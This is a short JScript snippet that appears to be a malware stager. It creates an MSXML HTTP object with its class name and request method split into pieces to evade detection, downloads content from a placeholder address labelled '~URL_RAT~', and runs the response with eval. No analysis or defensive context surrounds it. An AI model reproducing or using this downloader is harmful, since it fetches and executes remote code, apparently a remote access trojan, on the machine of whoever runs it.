x = new ActiveXObject("Msxml2.ServerX"+"MLHTTP.6.0");
x.open("GE"+"T", "~URL_RAT~", false);
x.send();
eval(x.responseText);